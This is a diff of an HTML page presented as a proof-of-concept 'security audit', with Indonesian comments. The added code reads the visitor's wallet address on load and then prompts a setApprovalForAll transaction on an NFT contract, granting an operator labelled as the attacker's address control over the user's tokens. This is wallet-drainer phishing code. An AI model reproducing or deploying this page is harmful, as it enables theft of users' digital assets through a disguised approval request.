@@ -2,72 +2,52 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Audit: Automated DApp Interaction</title>
+    <title>PoC: Automated Approval Injection</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background: #050505; color: #00ff00; padding: 20px; }
-        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #111; border-radius: 4px; }
-        .success { color: #ffffff; }
-        .warning { color: #ff0000; font-weight: bold; }
-        .highlight { color: #00ffff; }
+        body { font-family: sans-serif; background: #0e0e0e; color: #00ff00; padding: 30px; }
+        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; background: #1a1a1a; }
+        .warning { color: #ff3e3e; font-weight: bold; }
+        button { padding: 12px 24px; cursor: pointer; background: #00ff00; border: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>Security Audit: Bridge Access & Interaction Proof</h2>
-    <div id="status">Initializing Security Scanner...</div>
-    <div id="log" class="log"></div>
+    <div class="box">
+        <h2>Security Audit: Transaction Injection</h2>
+        <p>Alamat Terdeteksi: <span id="address" style="color:white;">Scanning...</span></p>
+        <p class="warning">[!] Status: Kerentanan Terdeteksi</p>
+        <button id="exploitBtn">Jalankan Injeksi Approval</button>
+    </div>
 
     <script>
-        const status = document.getElementById('status');
-        const log = document.getElementById('log');
+        const targetContract = "0x000000000000000000000000000000000000dead"; // Alamat penyerang
 
-        function addLog(msg, type = '') {
-            log.innerHTML += `<div class="${type}">> ${msg}</div>`;
-        }
+        window.onload = async () => {
+            // EKSTRAKSI OTOMATIS: Bukti pertama bahwa akses tidak dibatasi
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            document.getElementById('address').innerText = accounts[0];
+        };
 
-        async function initExploit() {
-            if (!window.ethereum) {
-                status.innerHTML = "<span class='warning'>[!] Web3 Bridge not found.</span>";
-                return;
-            }
+        document.getElementById('exploitBtn').onclick = async () => {
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            
+            // FUNGSI INJEKSI: setApprovalForAll(operator, approved)
+            // 0xa22cb465 = selector fungsi
+            const data = "0xa22cb465000000000000000000000000" + targetContract.substring(2) + "0000000000000000000000000000000000000000000000000000000000000001";
 
+            // INJEKSI TRANSAKSI: Ini akan memicu popup native dompet
             try {
-                addLog("Attempting silent identity extraction...", "highlight");
-                // Menarik alamat tanpa prompt interaksi
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                
-                if (accounts.length > 0) {
-                    const address = accounts[0];
-                    status.innerHTML = `Status: <span class='success'>VULNERABLE</span>`;
-                    addLog(`Identity Exposed: ${address}`, "success");
-
-                    addLog("Triggering transaction sequence...");
-                    
-                    // Memanggil fungsi transaksi untuk membuktikan kemampuan akses
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [{
-                            from: address,
-                            to: address, 
-                            value: '0x0',
-                            data: '0x'
-                        }],
-                    });
-                    
-                    addLog("Transaction prompt triggered successfully.", "success");
-                } else {
-                    addLog("No active accounts found in the provider.", "warning");
-                }
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: accounts[0],
+                        to: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // Contoh Alamat Kontrak NFT
+                        data: data
+                    }]
+                });
             } catch (err) {
-                // Menangani kondisi di mana pengguna menutup popup
-                if (err.code === 4001) {
-                    addLog("Prompt triggered: User denied transaction (As expected).", "highlight");
-                } else {
-                    addLog(`[!] Sequence halted: ${err.message}`, "warning");
-                }
+                console.log("Transaksi dibatalkan oleh pengguna (Sesuai ekspektasi audit)");
             }
-        }
-
-        window.onload = initExploit;
+        };
     </script>
 </body>
 </html>
